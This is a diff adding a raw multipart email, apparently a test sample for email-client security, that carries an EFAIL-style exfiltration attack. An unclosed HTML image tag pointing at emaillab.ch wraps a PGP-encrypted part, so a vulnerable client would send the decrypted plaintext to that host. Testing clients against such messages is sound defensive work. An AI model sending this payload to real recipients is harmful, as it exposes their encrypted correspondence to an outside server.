@@ -1,0 +1,20 @@
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+Subject: Attack
+From: samuel.bell@emaillab.ch
+To: chris.pruett@emaillab.ch
+
+--BOUNDARY
+Content-Type: text/html
+
+<img src="http://emaillab.ch/
+--BOUNDARY
+Content-Type: text/application/pkcs7-mime; smime-type="enveloped-data"; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+-----BEGIN PGP MESSAGE-----
+hQEMA6AFWfTh1RA0AQf/RPG2JZVWuOHnDs10cMF8H3dAZEJbW3EorhAqn1rJGkucYP6RrDqVljUa1UymsXpLNEQKKiY9Ucnpn+pxKhCURjmyPnlips8c48w/XKBzyTLEg55McOs10aNEkiIV9yanMLeK0xMxn2E59XyUt+TfaCPxhOMUj9L0QajtMgWIIlz7mJCQ7t4CIm94YO9mUeiRsWzQGbUCYnHDHywgcjEhZhHXcFUOtC7qHLO2tLwyoN6NeWqOPIe0Ecu2pxj1zbiTpPbGeOs2llde49Xfs/DtDJJKFu55hrZv9AogTL2N0jtUFQvk5V/tCDo2n8x7d9V1NdmzmeQcDyc78f+v2arciNJxAeAr480Bi8RhrP2znkO7r1kCqFQVOGrFGhMnjc672PF8pLT0S3Z60NxNPn3w8HcT4o+lHpY4m8x1Zrglhv+/IEoRF5p3bISYvYA8OnEf+C9Mmc1lW8Bntwxh8y20ss0GHL6bKQvrlqEBKpqEWrh0l24=
+-----END PGP MESSAGE-----
+--BOUNDARY
+Content-Type: text/html
+">
+--BOUNDARY--
